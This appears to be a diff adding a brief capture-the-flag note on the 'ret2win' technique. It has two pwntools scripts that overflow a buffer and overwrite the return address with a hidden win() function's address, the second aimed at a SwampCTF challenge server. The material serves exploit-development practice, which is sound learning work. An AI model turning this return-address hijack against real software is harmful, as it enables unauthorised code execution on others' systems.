@@ -1,0 +1,50 @@
+Ret2Win the binary
+win() function is located somewhere else in the binary, not being called.
+
+```
+from pwn import *            # This is how we import pwntools
+
+p = process('./binary')        # We're starting a new process
+
+payload = b'A' * 52
+payload += p32(0x080491c3)   # Use pwntools to pack it
+
+log.info(p.clean())          # Receive all the text
+p.sendline(payload)
+
+log.info(p.clean()) 
+```
+
+```
+from pwn import *             
+
+from pwn import *
+
+# Set the architecture and OS context
+context.update(arch='x86_64', os='linux')
+context.terminal = ['/bin/bash', '-c']  # Use standard Linux terminal
+
+# Remote target details
+HOST = "nc chals.swampctf.com 40001"
+ADDRESS, PORT = HOST.split()[1:]
+
+# Load the binary
+BINARY_NAME = "./binary"
+binary = context.binary = ELF(BINARY_NAME, checksec=False)
+
+# Determine if running locally or remotely
+if args.REMOTE:
+    p = remote(ADDRESS, int(PORT))
+else:
+    p = process(binary.path)
+
+# Payload parameters
+length = 10 + 8
+win = binary.sym.win
+payload = length * b'A' + p64(win)
+
+# Send payload
+p.sendline(payload)
+p.interactive()
+
+```
